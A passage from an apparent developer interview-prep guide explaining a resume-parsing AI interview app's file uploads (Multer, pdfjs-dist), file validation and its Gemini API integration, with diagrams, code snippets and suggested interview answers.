    Controller->>DB: Interview.findById(interviewId)
    DB-->>Controller: Interview document with all questions
    Controller->>Controller: Get question at questionIndex
    
    alt No answer provided
        Controller->>DB: Set score=0, feedback="No answer submitted"
        Controller-->>Browser: {feedback: "No answer submitted"}
    else Timer exceeded
        Controller->>Controller: Check: timeTaken > question.timeLimit?
        Controller->>DB: Set score=0, feedback="Time limit exceeded"
        Controller-->>Browser: {feedback: "Time limit exceeded"}
    else Valid answer
        Controller->>AI: Send question + answer to Gemini
        AI-->>Controller: {confidence: 8, communication: 7, correctness: 9, finalScore: 8, feedback: "..."}
        Controller->>Controller: Strip code fences, JSON.parse()
        Controller->>DB: Save scores and feedback to question sub-document
        Controller-->>Browser: {feedback: "Good structured answer..."}
    end
```

**What to highlight in the interview:**

> *"Notice how there are 3 code paths in this single endpoint. I don't call the expensive Gemini API if the user didn't submit an answer or exceeded the time limit — that's a cost optimization. The server validates time on its own side even though the client has a timer, because client-side validation can be bypassed through DevTools."*

---

### ❓ Q8: What happens when a user uploads a resume?

**Answer — the complete lifecycle of a single PDF file:**

```mermaid
flowchart TD
    A["👤 User selects PDF in file picker"] --> B["Frontend: <input type='file' accept='application/pdf'>"]
    B --> C["Frontend validates: resumeFile exists?"]
    C --> D["new FormData()  →  formdata.append('resume', file)"]
    D --> E["axios.post('/api/interview/resume', formdata, {withCredentials: true})"]
    
    E --> F["🖥️ Server receives request"]
    F --> G["Multer middleware intercepts"]
    
    subgraph "Multer Processing"
        G --> H["Check file size ≤ 5MB"]
        H -->|"Too large"| I["❌ 413 Payload Too Large"]
        H -->|"OK"| J["Generate unique filename:<br/>1695312000000-resume.pdf"]
        J --> K["Write file to: server/public/<filename>"]
        K --> L["Attach req.file = {path, originalname, size, ...}"]
    end
    
    L --> M["Controller: analyzeResume()"]
    
    subgraph "PDF Processing"
        M --> N["fs.promises.readFile(filepath) → Buffer"]
        N --> O["new Uint8Array(buffer)"]
        O --> P["pdfjsLib.getDocument({data: uint8Array})"]
        P --> Q["Loop pages with Promise.all()"]
        Q --> R["page.getTextContent() → extract text items"]
        R --> S["Join all text → sanitize whitespace"]
    end
    
    S --> T["Send sanitized text to Gemini AI"]
    
    subgraph "AI Processing"
        T --> U["System prompt: 'Extract structured data, return JSON'"]
        U --> V["Gemini returns: {role, experience, projects, skills}"]
        V --> W["Strip code fences → JSON.parse()"]
    end
    
    W --> X["🗑️ fs.unlinkSync(filepath) — DELETE the PDF immediately"]
    X --> Y["📤 Response: {role, experience, projects, skills, resumeText}"]
    Y --> Z["⚛️ Frontend updates state:<br/>setRole, setExperience, setProjects, setSkills"]
    Z --> AA["UI shows 'Resume Analysis Result' section"]
    
    style X fill:#ff6b6b,color:white
```

**Critical detail — the file only exists for ~5 seconds:**

```
Time 0s:   Multer writes PDF to disk
Time 0.1s: fs.readFile reads it into memory (Buffer)
Time 0.5s: pdfjs-dist extracts text from Buffer
Time 2-4s: Gemini AI processes the text
Time 4-5s: fs.unlinkSync DELETES the file from disk
```

The file is **never stored permanently**. It exists on disk only during the request processing. This is a privacy-first design — resumes contain sensitive PII (names, phone numbers, addresses).

---

### ❓ Q9: Explain your Multer implementation.

**Answer — line by line from your `middlewares/multer.js`:**

```js
import multer from "multer";

// STORAGE ENGINE — tells Multer WHERE and HOW to save files
const storage = multer.diskStorage({
    
    // WHERE to save: the "public" folder inside /server
    destination: function(req, file, cb) {
        cb(null, "public")
        // cb = callback. cb(error, destinationPath)
        // cb(null, ...) means "no error, use this path"
    },
    
    // WHAT to name the file: timestamp + original name
    filename: function(req, file, cb) {
        const filename = Date.now() + "-" + file.originalname;
        cb(null, filename)
        // Example: "1695312000000-siddhesh_resume.pdf"
        // Date.now() prevents name collisions if 2 users upload simultaneously
    }
})

// CREATE the Multer instance with the storage engine + limits
export const upload = multer({
    storage,
    limits: { fileSize: 5 * 1024 * 1024 }, // 5MB = 5 × 1024 × 1024 bytes
});
```

**How it's used in the route (from `routes/interview.route.js`):**

```js
interviewRouter.post("/resume", isAuth, upload.single("resume"), analyzeResume)
//                                       ^^^^^^^^^^^^^^^^^^^^^^^^^
//                                       upload.single("resume") means:
//                                       - Accept EXACTLY 1 file
//                                       - From the form field named "resume"
//                                       - Save it using our diskStorage engine
//                                       - Attach file info to req.file
```

**After Multer runs, `req.file` looks like this:**

```js
req.file = {
    fieldname: 'resume',                              // Form field name
    originalname: 'siddhesh_resume.pdf',              // User's filename
    encoding: '7bit',                                  // Transfer encoding
    mimetype: 'application/pdf',                       // File MIME type
    destination: 'public',                             // Where it's saved
    filename: '1695312000000-siddhesh_resume.pdf',    // Generated filename
    path: 'public/1695312000000-siddhesh_resume.pdf', // Full path on disk
    size: 245760                                       // Size in bytes
}
```

**Why `diskStorage` over `memoryStorage`?**

```mermaid
flowchart LR
    subgraph "diskStorage (your choice)"
        A1["File saved to disk"] --> B1["fs.readFile reads from disk path"]
        B1 --> C1["pdfjs-dist processes from Buffer"]
        D1["✅ Memory stays low for large files"]
    end
    
    subgraph "memoryStorage (alternative)"
        A2["File held in RAM as Buffer"] --> B2["Directly available as req.file.buffer"]
        C2["⚠️ Large files eat server memory"]
    end
```

For a production app with many concurrent uploads, `diskStorage` is safer — it doesn't fill up server RAM.

---

### ❓ Q10: How do you validate uploaded files?

**Answer — validation happens at 3 layers:**

```mermaid
flowchart TD
    A["📤 User selects file"] --> B{"Layer 1: Frontend Validation"}
    
    B --> C["HTML accept attribute:<br/>accept='application/pdf'"]
    C --> D["Only PDF files shown in file picker<br/>⚠️ Can be bypassed by user"]
    
    D --> E{"Layer 2: Multer Validation"}
    E --> F["File size check:<br/>limits: { fileSize: 5 * 1024 * 1024 }"]
    F -->|"> 5MB"| G["❌ Multer throws LIMIT_FILE_SIZE error"]
    F -->|"≤ 5MB"| H["File saved to disk"]
    
    H --> I{"Layer 3: Controller Validation"}
    I --> J["Check req.file exists:<br/>if (!req.file) return 400"]
    J --> K["pdfjs-dist tries to parse:<br/>getDocument({data: uint8Array})"]
    K -->|"Not a valid PDF"| L["❌ pdfjs throws error<br/>catch block → 500 + file cleanup"]
    K -->|"Valid PDF"| M["✅ Extract text successfully"]
```

**What's currently validated:**

| Validation | Where | How |
|---|---|---|
| File type hint | Frontend `<input>` | `accept="application/pdf"` — only shows PDFs in file picker (client-side only, bypassable) |
| File size | Multer middleware | `limits: { fileSize: 5 * 1024 * 1024 }` — rejects files > 5MB before controller even runs |
| File existence | Controller | `if (!req.file) return res.status(400).json({ message: "Resume required" })` |
| File format | pdfjs-dist | `getDocument()` throws if the binary data isn't a valid PDF |

**What's NOT currently validated (honesty for interviews):**

| Missing Validation | Risk | How to fix |
|---|---|---|
| MIME type check | User could rename `.exe` to `.pdf` | Add `fileFilter` to Multer — check `file.mimetype === 'application/pdf'` |
| Magic bytes check | Crafted files could bypass MIME check | Read first 5 bytes — PDF files always start with `%PDF-` |
| Malicious content | PDF could contain JavaScript or exploits | Use a sandboxed PDF parser, or scan with antivirus API |

**If the interviewer asks "how would you add proper file type validation?":**

```js
// Enhanced Multer configuration:
export const upload = multer({
    storage,
    limits: { fileSize: 5 * 1024 * 1024 },
    fileFilter: function(req, file, cb) {
        // Check MIME type
        if (file.mimetype !== 'application/pdf') {
            return cb(new Error('Only PDF files are allowed'), false);
        }
        // Check file extension
        const ext = path.extname(file.originalname).toLowerCase();
        if (ext !== '.pdf') {
            return cb(new Error('Only .pdf extension is allowed'), false);
        }
        cb(null, true);  // Accept the file
    }
});
```

---

### ❓ Q11: What happens if the uploaded file is corrupted?

**Answer:**

A corrupted file means the binary data doesn't conform to the PDF specification. Here's what happens in your code:

```mermaid
flowchart TD
    A["Corrupted PDF uploaded"] --> B["Multer saves it to disk<br/>(Multer doesn't validate content, only size)"]
    B --> C["fs.readFile reads corrupt bytes into Buffer"]
    C --> D["new Uint8Array(buffer) — still works, it's just bytes"]
    D --> E["pdfjsLib.getDocument({data: uint8Array})"]
    E --> F{"Can pdfjs parse it?"}
    F -->|"Completely invalid<br/>(not a PDF at all)"| G["🔴 pdfjs THROWS an error<br/>'Invalid PDF structure'"]
    F -->|"Partially corrupt<br/>(some pages readable)"| H["🟡 pdfjs may extract partial text<br/>or throw on specific pages"]
    F -->|"Valid PDF"| I["🟢 Normal processing"]
    
    G --> J["catch block activates"]
    J --> K["File cleanup:<br/>if (req.file && fs.existsSync(req.file.path))<br/>  fs.unlinkSync(req.file.path)"]
    K --> L["res.status(500).json({message: error.message})"]
    
    H --> M["If partial text extracted → sent to Gemini"]
    M --> N["Gemini may return incomplete/wrong data"]
    N --> O["User sees incorrect resume analysis<br/>Can re-upload and try again"]
```

**Key point:** The `try-catch` in `analyzeResume` is the safety net. The corrupted file is:
1. **Always deleted** — the catch block checks `fs.existsSync` and runs `unlinkSync`
2. **Never persisted** — no corrupt data enters MongoDB
3. **Reported cleanly** — the user gets an error message, not a server crash

**How you'd make this more robust:**

```js
// Add early validation after reading the file:
const fileBuffer = await fs.promises.readFile(filepath);
const uint8Array = new Uint8Array(fileBuffer);

// Check PDF magic bytes (first 5 bytes should be "%PDF-")
const header = String.fromCharCode(...uint8Array.slice(0, 5));
if (header !== '%PDF-') {
    fs.unlinkSync(filepath);
    return res.status(400).json({ message: "File is not a valid PDF" });
}
```

---

### ❓ Q12: What happens if the user uploads a very large file?

**Answer — defense happens at 2 levels:**

**Level 1: Multer rejects it BEFORE it's fully uploaded**

```js
// From multer.js:
limits: { fileSize: 5 * 1024 * 1024 } // 5MB
```

When a file exceeds 5MB, Multer throws a `LIMIT_FILE_SIZE` error. The file upload **stops immediately** — Multer doesn't wait to receive the entire file. This protects the server from both disk space exhaustion and slow uploads.

**Level 2: Even within the 5MB limit, there's an implicit text size concern**

A 5MB PDF could contain massive amounts of text (dense resumes with lots of content). This text gets sent to the Gemini API, which has token limits.

```mermaid
flowchart TD
    A["5MB PDF uploaded"] --> B["Multer: size ≤ 5MB ✅ accepted"]
    B --> C["pdfjs extracts: maybe 50,000 characters of text"]
    C --> D["Sanitize: .replace(/\\s+/g, ' ').trim()"]
    D --> E["Maybe 40,000 characters after sanitization"]
    E --> F["Sent to Gemini API"]
    F --> G{"Gemini context window"}
    G -->|"Within limits"| H["✅ Processes normally"]
    G -->|"Too many tokens"| I["🔴 Gemini API error:<br/>'Input exceeds model context length'"]
    I --> J["catch block → 500 error to user"]
```

**What you'd do to handle this better:**

```js
// Add a text length check after extraction:
resumeText = resumeText.replace(/\s+/g, " ").trim();

if (resumeText.length > 15000) {
    // Truncate to first 15,000 characters (roughly 3,750 tokens)
    resumeText = resumeText.substring(0, 15000);
}
```

**In an interview, you can say:**

> *"Multer enforces a 5MB hard limit at the middleware level. For the AI processing, I sanitize whitespace to reduce text size. If I were to harden this further, I'd add a character count limit on the extracted text before sending it to Gemini, and I'd also limit the page count — most real resumes are 1-2 pages, so I'd reject anything over 5 pages as likely not a resume."*

---

### ❓ Q13: How do you handle invalid file types?

**Honest answer about your current code:**

**Currently, file type validation is minimal:**

```js
// Frontend: only a HINT to the file picker (not a real validation)
<input type="file" accept="application/pdf" />

// Backend Multer: NO fileFilter configured
// Backend Controller: relies on pdfjs-dist to throw if it's not a PDF
```

This means if someone uses DevTools or Postman to send a `.docx` or `.jpg` file, Multer would accept it (it's under 5MB), save it to disk, and then `pdfjsLib.getDocument()` would throw an error because it's not valid PDF binary data. The file would be cleaned up in the catch block.

**Why this still "works" but isn't ideal:**

```mermaid
flowchart TD
    A["User sends a .docx file (disguised as resume)"] --> B["Multer: No fileFilter → accepts it"]
    B --> C["Saves to disk as 1695312000000-resume.docx"]
    C --> D["fs.readFile reads it"]
    D --> E["pdfjsLib.getDocument() tries to parse"]
    E --> F["🔴 Throws: 'Invalid PDF structure'"]
    F --> G["catch block runs"]
    G --> H["File deleted from disk ✅"]
    G --> I["500 error returned to user"]
    
    style B fill:#ff9999
    style H fill:#99ff99
```

**The problem:** The invalid file was saved to disk and processed unnecessarily. It wastes disk I/O and server CPU.

**How to properly validate (what you'd add in a production version):**

```js
// multer.js — add a fileFilter:
const storage = multer.diskStorage({ /* ... same as before ... */ });

const fileFilter = (req, file, cb) => {
    // Check 1: MIME type
    if (file.mimetype !== 'application/pdf') {
        return cb(new multer.MulterError('LIMIT_UNEXPECTED_FILE', 'resume'), false);
    }
    
    // Check 2: File extension
    if (!file.originalname.toLowerCase().endsWith('.pdf')) {
        return cb(new Error('Only PDF files are accepted'), false);
    }
    
    cb(null, true); // Accept
};

export const upload = multer({
    storage,
    fileFilter,                          // ← ADD THIS
    limits: { fileSize: 5 * 1024 * 1024 },
});
```

> **Interview tip:** Admitting what's missing shows maturity. Say: *"Currently I rely on pdfjs-dist to reject non-PDF files at parse time. For production, I'd add a Multer fileFilter to reject them before they're even saved to disk — that's more efficient and gives the user a clearer error message."*

---

### ❓ Q14: Where is resume data stored?

**Answer — this is a tricky question because the data lives in DIFFERENT places at DIFFERENT times:**

```mermaid
flowchart LR
    subgraph "🕐 During Upload (temporary)"
        A["PDF file on disk<br/>server/public/1695312000000-resume.pdf<br/>⏱️ Exists for ~5 seconds<br/>🗑️ DELETED after parsing"]
    end
    
    subgraph "📦 After Parsing (permanent)"
        B["MongoDB — Interview document<br/>{<br/>  resumeText: 'John Doe Software Eng...',<br/>  role: 'Frontend Developer',<br/>  experience: '2 years',<br/>  ...<br/>}"]
    end
    
    subgraph "🧠 In Browser Memory (session)"
        C["React state variables:<br/>• role (useState)<br/>• experience (useState)<br/>• projects (useState)<br/>• skills (useState)<br/>• resumeText (useState)<br/>Lost on page refresh!"]
    end
    
    A -->|"pdfjs extracts text<br/>Gemini structures data"| B
    A -->|"API response"| C
```

**The 3 locations and their lifespans:**

| Data | Where | Lifespan | Why |
|---|---|---|---|
| **Original PDF file** | `server/public/` (disk) | ~5 seconds | Deleted with `fs.unlinkSync` for privacy. We only need the text. |
| **Extracted `resumeText`** (raw text) | MongoDB `Interview.resumeText` | Permanent | Stored so Gemini can reference it during question generation. Saved when `Interview.create()` runs. |
| **Structured data** (role, skills, projects) | Frontend React state | Current session | Displayed to user for confirmation before starting interview. Not stored on server separately — they become part of the prompt sent to Gemini. |
| **role, experience, mode** | MongoDB `Interview` document | Permanent | Stored when interview is created via `Interview.create({ role, experience, mode, ... })` |

**The key insight:**

> *"The original PDF file is NEVER permanently stored. I only keep the extracted text. This is a deliberate privacy decision — if our database were compromised, attackers would get text extracts but not the original documents with personal formatting, embedded metadata, or hidden data that PDFs can contain."*

**Flow of data persistence:**

```mermaid
sequenceDiagram
    participant PDF as 📄 PDF File
    participant Disk as 💾 Disk
    participant Mem as 🧠 Server Memory  
    participant AI as 🤖 Gemini
    participant DB as 🗄️ MongoDB
    participant React as ⚛️ React State

    PDF->>Disk: Multer saves to /public
    Disk->>Mem: fs.readFile → Buffer
    Mem->>Mem: pdfjs extracts text
    Disk->>Disk: 🗑️ fs.unlinkSync (file deleted!)
    Mem->>AI: Send text + system prompt
    AI-->>Mem: {role, experience, projects, skills}
    Mem-->>React: Response sent to frontend
    React->>React: setState for each field
    
    Note over React: User clicks "Start Interview"
    
    React->>Mem: POST /generate-questions with {role, experience, ...}
    Mem->>DB: Interview.create({role, experience, resumeText, questions})
    Note over DB: THIS is where data becomes permanent
```

---

### ❓ Q15: How does the backend process the extracted content?

**Answer — the extracted resume text goes through a 3-stage AI pipeline:**

```mermaid
flowchart TD
    A["📝 Raw extracted text from pdfjs<br/>'John    Doe  Software Engineer   3 yrs exp...'"] 
    A --> B["Stage 0: Text Sanitization"]
    
    subgraph "Stage 0: Sanitization"
        B --> C[".replace(/\\s+/g, ' ').trim()"]
        C --> D["Clean text: 'John Doe Software Engineer 3 yrs exp...'"]
    end
    
    D --> E["Stage 1: AI-Powered Structuring"]
    
    subgraph "Stage 1: Resume Structuring (analyzeResume)"
        E --> F["System Prompt: 'Extract structured data, return JSON'"]
        F --> G["Gemini processes entire resume text"]
        G --> H["Returns: {role, experience, projects, skills}"]
        H --> I["Strip code fences → JSON.parse()"]
    end
    
    I --> J["📤 Send to frontend → User confirms"]
    J --> K["Stage 2: Question Generation"]
    
    subgraph "Stage 2: Question Generation (generateQuestion)"
        K --> L["Build context prompt:<br/>'Role: Frontend Dev<br/>Experience: 2 years<br/>Skills: React, Node<br/>Projects: InterviewIQ<br/>Resume: ...'"]
        L --> M["System Prompt: 'Generate 10 questions,<br/>easy→medium→hard'"]
        M --> N["Gemini generates personalized questions"]
        N --> O["Split by \\n → Array of 10 questions"]
        O --> P["Map each to difficulty + timeLimit"]
        P --> Q["Create Interview document in MongoDB"]
    end
    
    Q --> R["Stage 3: Per-Answer Evaluation"]
    
    subgraph "Stage 3: Answer Evaluation (submitAnswer × 10)"
        R --> S["For each answer:<br/>Send question + answer to Gemini"]
        S --> T["System Prompt: 'Score confidence,<br/>communication, correctness (0-10)'"]
        T --> U["Gemini returns JSON scores + feedback"]
        U --> V["Save to question sub-document in MongoDB"]
    end
```

**Stage 0 — Text Sanitization (why it matters):**

PDFs are not simple text files. They're a complex layout format. When `pdfjs-dist` extracts text, it often produces:
- Double/triple spaces between words
- Tab characters from table layouts
- Newlines from column layouts
- Invisible characters from decorative elements

```js
resumeText = resumeText
    .replace(/\s+/g, " ")  // Collapse ALL whitespace (spaces, tabs, newlines) into single spaces
    .trim();                 // Remove leading/trailing whitespace
```

Before: `"John    Doe\n\n\tSoftware\t\tEngineer     3\n years"`
After: `"John Doe Software Engineer 3 years"`

This matters because:
1. Gemini has token limits — extra whitespace wastes tokens
2. Clean text → better AI understanding → better structured output
3. Reduces API costs (you pay per token)

**Stage 1 — Structuring (the clever part):**

Instead of trying to parse resume formats with regex (nightmare), we delegate to AI:

```js
const messages = [
    {
        role: "system",
        content: `Extract structured data from resume.
Return strictly JSON:
{
  "role": "string",
  "experience": "string", 
  "projects": ["project1", "project2"],
  "skills": ["skill1", "skill2"]
}`
    },
    {
        role: "user",
        content: resumeText  // The cleaned text
    }
];

const aiResponse = await askAi(messages);
const cleanedResponse = aiResponse.replace(/```json/g, "").replace(/```/g, "").trim();
const parsed = JSON.parse(cleanedResponse);
```

> *"Using AI for resume parsing is a strategic choice. Resumes come in thousands of different formats — headers, bullets, tables, sidebars. Writing a deterministic parser for all formats would take months and still miss edge cases. The AI handles format diversity naturally because it understands the semantic meaning, not just the structure."*

**Stage 2 — Question Generation (personalization):**

The user-confirmed data (role, experience, skills, projects) plus the full resume text form a **context-rich prompt**:

```js
const userPrompt = `
Role: ${role}                    // "Frontend Developer"
Experience: ${experience}        // "2 years"
InterviewMode: ${mode}           // "Technical"
Projects: ${projectText}         // "InterviewIQ, E-commerce App"
Skills: ${skillsText}            // "React, Node.js, MongoDB"
Resume: ${safeResume}            // Full resume text as context
`;
```

This prompt is why every user gets **unique questions**. A React developer with 2 years experience gets different questions than a DevOps engineer with 5 years experience.

After Gemini responds with 10 questions (one per line):

```js
const questionsArray = aiResponse
    .split("\n")           // Split into array by newline
    .map(q => q.trim())    // Remove whitespace
    .filter(q => q.length > 0)  // Remove empty lines
    .slice(0, 10);         // Take exactly 10 (in case AI generated more)

// Then map each to difficulty and time limit:
questions: questionsArray.map((q, index) => ({
    question: q,
    difficulty: ["easy","easy","easy","medium","medium","medium","medium","hard","hard","hard"][index],
    timeLimit: [60, 60, 60, 90, 90, 90, 90, 120, 120, 120][index],
}))
```

**Stage 3 — Per-Answer Evaluation:**

Each of the 10 answers is independently scored by Gemini. The prompt forces a **structured JSON response**:

```js
{
    "confidence": 8,       // How clearly and self-assuredly they answered
    "communication": 7,    // How well-structured and articulate the answer was
    "correctness": 9,      // How technically accurate the answer was
    "finalScore": 8,       // Average of the 3 above
    "feedback": "Strong answer with good examples, could add more depth on edge cases"
}
```

These scores are saved directly into the embedded question sub-document in MongoDB, building up the complete interview record question by question.

---

## Section 17: Gemini / AI — Interview Q&A (Complete Deep Dive)

> This section covers 25 AI/LLM interview questions — from how your code calls Gemini to deep LLM theory.
> Every answer connects the **concept** to your **actual code** so you understand both.

---

### ❓ Q1: Why did you use Gemini?

**Answer:**

I chose **Gemini 3.5 Flash Lite** for 3 specific reasons:

| Factor | Gemini Flash Lite | GPT-4 / Claude | Why it matters |
|---|---|---|---|
| **Speed** | ~1-3s response | ~5-10s response | Users wait for AI during live interview — speed = UX |
| **Cost** | Very low per token | 10-50x more expensive | Each interview makes 12+ API calls (1 parse + 1 generate + 10 evaluate) |
| **Capability** | Sufficient for structured extraction + scoring | Overkill for this task | We're extracting JSON and scoring answers 0-10, not writing novels |

**🎤 Interview-ready answer:**

> *"I chose Gemini Flash Lite because our use case — resume parsing, question generation, and answer scoring — doesn't need frontier-model intelligence. Flash Lite gives sub-2-second responses at a fraction of the cost of GPT-4, which matters because each interview session makes 12+ API calls. The cost-per-interview stays low enough to support our credit-based monetization model."*

---

### ❓ Q2: What API did you use?

**Answer:**

I use the **Google Gemini REST API** directly via Axios — NOT the Google AI SDK.

```js
// From openRouter.service.js:
const url = `https://generativelanguage.googleapis.com/v1beta/models/gemini-3.5-flash-lite:generateContent?key=${process.env.OPENROUTER_API_KEY}`;
```

**URL breakdown:**

```
https://generativelanguage.googleapis.com   ← Google AI base URL
/v1beta                                      ← API version (beta)
/models/gemini-3.5-flash-lite                ← Specific model
:generateContent                             ← Action (RPC-style)
?key=AIza...                                 ← API key as query param
```

**Why direct REST instead of the `@google/generative-ai` SDK?**

1. **No extra dependency** — Axios was already in the project
2. **Full control** — I see exactly what payload is sent and returned
3. **Provider flexibility** — My `askAi()` accepts OpenAI-style messages; switching providers means changing one file

**🎤 Interview-ready answer:**

> *"I call Gemini's REST API directly using Axios with the generateContent endpoint. I intentionally avoided the official SDK to keep full control over the request/response cycle and make the service provider-agnostic. The askAi function accepts OpenAI-style message arrays and converts them to Gemini's format internally — switching AI providers requires changing only one file."*

---

### ❓ Q3: How does your application communicate with Gemini?

**Answer:**

Through a **service abstraction layer** (`openRouter.service.js`):

```mermaid
sequenceDiagram
    participant Controller as 🎮 Controller
    participant Service as 🔌 askAi()
    participant Gemini as 🤖 Gemini API

    Controller->>Service: askAi([ {role:"system",...}, {role:"user",...} ])
    Service->>Service: Convert format:<br/>system → systemInstruction<br/>user → contents[{role:"user"}]
    Service->>Gemini: POST /generateContent<br/>{contents, systemInstruction}
    Gemini-->>Service: {candidates:[{content:{parts:[{text:"..."}]}}]}
    Service->>Service: Extract text + validate non-empty
    Service-->>Controller: Clean text string
```

**The format conversion:**

```js
// Controllers send:
{ role: "system", content: "..." }     →  systemInstruction: { parts: [{text:"..."}] }
{ role: "user", content: "..." }       →  contents: [{ role: "user", parts: [{text:"..."}] }]
{ role: "assistant", content: "..." }  →  contents: [{ role: "model", parts: [{text:"..."}] }]
```

Gemini uses `"model"` instead of `"assistant"`, and separates system instructions from conversation. The service handles this so controllers never see Gemini's format.

---

### ❓ Q4: What information do you send to the model?

**Answer — 3 distinct API calls, each sending different data:**

| API Call | System Prompt (instructions) | User Message (data) |
|---|---|---|
| **Resume Parsing** | "Extract structured data, return JSON: {role, experience, projects, skills}" | Raw sanitized resume text |
| **Question Generation** | "You are an interviewer. Generate 10 questions. 15-25 words. Easy→Medium→Hard." | "Role: Frontend Dev, Experience: 2 years, Skills: React, Node..." |
| **Answer Evaluation (×10)** | "Score confidence/communication/correctness 0-10. Return JSON. Feedback 10-15 words." | "Question: How do hooks work? Answer: Hooks let you use state..." |

**What we NEVER send (security):**

- ❌ User's email/name — not needed for AI tasks
- ❌ MongoDB IDs — no reason to share internal identifiers
- ❌ JWT tokens — authentication stays between client and server
- ❌ Payment information — never crosses into AI calls
- ❌ PDF binary — we extract text first, only clean text goes to Gemini

---

### ❓ Q5: How did you design your prompt?

**Answer — 4 prompt engineering principles:**

**Principle 1: Role Assignment**
```
"You are a real human interviewer conducting a professional interview."
```
→ Sets persona, tone, and expertise level.

**Principle 2: Explicit Format Constraints**
```
"Return ONLY valid JSON"
"Each question: 15-25 words"
"Feedback: 10-15 words only"
```
→ Without these, AI returns paragraphs and inconsistent formats.

**Principle 3: Negative Instructions**
```
"Do NOT number them."
"Do NOT add explanations."
"Do NOT repeat the question."
```
→ LLMs are eager helpers — they add numbering, headers, and explanations by default. "Do NOT" is often more effective than positive instructions.

**Principle 4: Output Schema as Template**
```
Return ONLY valid JSON in this format:
{
  "confidence": number,
  "correctness": number,
  "feedback": "short human feedback"
}
```
→ AI fills in values instead of inventing its own structure.

**🎤 Interview-ready answer:**

> *"I used four principles: role assignment to set persona, explicit constraints for word counts and formats, negative instructions to suppress unwanted additions like numbering, and output schemas as templates. The key learning was that negative instructions — 'do NOT add numbering' — are more effective than positive ones because LLMs inherently want to be helpful and add formatting extras that break our parsing."*

---

### ❓ Q6: How do you ensure the response follows the expected format?

**Answer — 4-layer defense:**

```mermaid
flowchart TD
    A["AI Response"] --> B["Layer 1: Prompt<br/>'Return ONLY valid JSON'"]
    B --> C["Layer 2: Empty check<br/>if (!content || !content.trim()) throw"]
    C --> D["Layer 3: Sanitize<br/>.replace(/```json/g,'')<br/>.replace(/```/g,'').trim()"]
    D --> E["Layer 4: try-catch JSON.parse()"]
    E -->|"Success"| F["✅ Use parsed data"]
    E -->|"Failure"| G["❌ 500 error to client"]
```

```js
// Layer 2 — from openRouter.service.js:
if (!content || !content.trim()) {
    throw new Error("AI returned empty response.");
}

// Layer 3 — from controllers:
const cleanedResponse = aiResponse.replace(/```json/g, "").replace(/```/g, "").trim();

// Layer 4 — protected by try-catch:
const parsed = JSON.parse(cleanedResponse);
```

For question generation (non-JSON), validation is different:
```js
const questionsArray = aiResponse.split("\n").map(q => q.trim()).filter(q => q.length > 0).slice(0, 10);
if (questionsArray.length === 0) {
    return res.status(500).json({ message: "AI failed to generate questions." });
}
```

**🎤 Interview-ready answer:**

> *"Four layers: the prompt demands strict JSON, I check for empty responses, I sanitize by stripping markdown code fences the AI sometimes adds despite instructions, and every JSON.parse is inside try-catch so malformed responses give clean 500 errors instead of server crashes. The principle: never trust AI output — always validate and sanitize."*

---

### ❓ Q7: What happens if Gemini returns an unexpected response?

```mermaid
flowchart TD
    A["Unexpected output"] --> B{"Type?"}
    B -->|"Empty ''"| C["askAi throws 'empty response'"]
    B -->|"Code fences ```json...```"| D["Sanitization strips them → parse works ✅"]
    B -->|"Random text 'Here are some...'"| E["JSON.parse throws → catch → 500"]
    B -->|"Valid JSON, wrong shape {foo:'bar'}"| F["Parse succeeds but parsed.role = undefined"]
    B -->|"Partial JSON '{\"role\":'"| G["JSON.parse throws → catch → 500"]
    C --> H["Controller catch → 500 to client"]
    E --> H
    G --> H
```

**Gap in current code:** Wrong-shape JSON passes through because there's no schema validation after parsing.

**Fix:**
```js
const parsed = JSON.parse(cleanedResponse);
if (!parsed.role || !parsed.experience || !Array.isArray(parsed.skills)) {
    throw new Error("AI returned data in unexpected format");
}
```

---

### ❓ Q8: How do you handle API failures?

**From `openRouter.service.js`:**
```js
catch (error) {
    console.error("Gemini API Error:", error.response?.data || error.message);
    throw new Error(error.response?.data?.error?.message || "Gemini API Error");
}
```

**What this does:**
1. Logs full error details for debugging
2. Throws a cleaned-up error message to the controller
3. Controller catches it → returns 500 to client

**What's missing for production:**

| Feature | Current | Production |
|---|---|---|
| Retry logic | ❌ None | ✅ 3 retries with exponential backoff (2s, 4s, 8s) |
| Timeout | ❌ Axios default | ✅ `timeout: 30000` (30 seconds) |
| Circuit breaker | ❌ None | ✅ Stop calling after 5 consecutive failures |
| Fallback provider | ❌ None | ✅ Try OpenAI if Gemini fails |

**🎤 Interview-ready answer:**

> *"All Gemini calls are wrapped in try-catch at both service and controller levels. The service logs full error details and throws a clean error. For production, I'd add retry with exponential backoff, a 30-second timeout, a circuit breaker to prevent hammering a failing service, and a fallback to OpenAI — which the service abstraction makes straightforward."*

---

### ❓ Q9: What happens if the Gemini API is unavailable?

```mermaid
sequenceDiagram
    participant User as 👤 User
    participant React as ⚛️ Frontend
    participant Express as 🖥️ Backend
    participant Gemini as 🤖 Gemini (DOWN ❌)

    User->>React: Clicks "Analyze Resume"
    React->>Express: POST /api/interview/resume
    Express->>Gemini: POST /generateContent
    Gemini--xExpress: ❌ ECONNREFUSED / Timeout / 503
    Express->>Express: askAi() catch → throw
    Express->>Express: Controller catch block
    Express-->>React: 500 {message: "Gemini API Error"}
    React->>User: alert("Failed to analyze resume")
```

**Current:** User sees error, feature unavailable. All 3 core features depend on Gemini.

**Production improvement:**
```js
// Retry with exponential backoff:
export const askAi = async (messages, retries = 3) => {
    for (let attempt = 1; attempt <= retries; attempt++) {
        try {
            const response = await axios.post(url, payload, { timeout: 30000 });
            // ... return content
        } catch (error) {
            if (attempt === retries) throw error;
            const delay = Math.pow(2, attempt) * 1000; // 2s, 4s, 8s
            await new Promise(r => setTimeout(r, delay));
        }
    }
};
```

---

### ❓ Q10: How do you handle rate limits?

**Current:** No explicit handling. HTTP 429 is treated as a generic error.

**Why it hasn't been a problem:** Flash Lite has generous limits, small user base, ~12 calls per session.

**Production approach:**

```mermaid
flowchart TD
    A["Prevent hitting limits"] --> B["Server-side rate limiter<br/>express-rate-limit<br/>15 AI calls/user/minute"]
    A --> C["Request queue<br/>Max 5 concurrent Gemini calls"]
    A --> D["Read Retry-After header<br/>Auto-backoff on 429"]
```

```js
// Protect AI endpoints per-user:
import rateLimit from 'express-rate-limit';
const aiLimiter = rateLimit({
    windowMs: 60 * 1000,  // 1 minute
    max: 15,               // 15 AI calls per minute per user
    message: "Too many requests. Please wait."
});
app.use("/api/interview", aiLimiter);
```

---

### ❓ Q11: How would you reduce AI API cost?

Each interview = **12+ API calls**. Cost optimization strategies:

| Strategy | Savings | Details |
|---|---|---|
| **Smaller model** | ✅ Already done | Using Flash Lite (cheapest) |
